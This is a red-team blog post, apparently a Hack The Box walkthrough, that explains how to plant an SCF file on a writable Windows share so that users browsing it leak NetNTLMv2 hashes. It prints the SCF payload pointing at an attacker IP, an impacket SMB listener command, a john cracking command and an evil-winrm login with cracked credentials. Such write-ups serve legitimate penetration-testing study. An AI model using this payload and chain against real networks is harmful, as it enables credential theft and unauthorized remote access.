---
title:  "using-a-scf-file-to-gather-hashes"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: SMB-SCF  File Attacks(NetNTLMv2 hash(challenge) grab)
categories:
  - Red-Teaming
toc: true
---

Have you ever been on a internal network assessment and discovered an unauthenticated writable Windows-based file share? Well, in addition to finding potentially sensitive information, you can abuse this to gather user hashes from users who are browsing the file share.

## Gathering Hashes
It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer.
However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack.

## Create a file
The code  can be placed inside a text file which then needs to be planted into a network share.

Saving as SCF file will make the file to be executed when the user will browse the file

Adding the @ symbol in front of the filename will place the file.scf on the top of the share drive.
```
[shell]
Command=2
IconFile=\\10.10.16.2\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
Replace with your IP address of where you have Responder listening.

<img src="/img/fci/pay.PNG" alt="Getting-gz" width="800" height="200"> 

Next upload the file into the Desktop within the Public Folders.
The Public/Desktop folder is accessed every time any users logs in.
Therefore when the user logs in, the icon is requested from our attackers box, 
a challenge request is requested by the attacker, a challenger response is then returned to use with the NetNTLMv2.

## set listener 
```
impacket-smbserver -debug -smb2support share /home/nored0x/Desktop/HTB/driver     
```
<img src="/img/fci/listner.PNG" alt="Getting-gz" width="800" height="200"> 

When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user. During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key

<img src="/img/fci/hash.PNG" alt="Getting-gz" width="1000" height="300"> 

## crack hash 
```
john hash -w=/usr/share/wordlists/rockyou.txt
```

<img src="/img/fci/john.PNG" alt="Getting-gz" width="800" height="200"> 


## connect with evil-winrm
```
./evil-winrm.rb -i 10.10.11.106 -u tony -p liltony 
download tool:https://github.com/Hackplayers/evil-winrm
``` 
 
<img src="/img/fci/connect.PNG" alt="Getting-gz" width="800" height="200"> 

  
                       
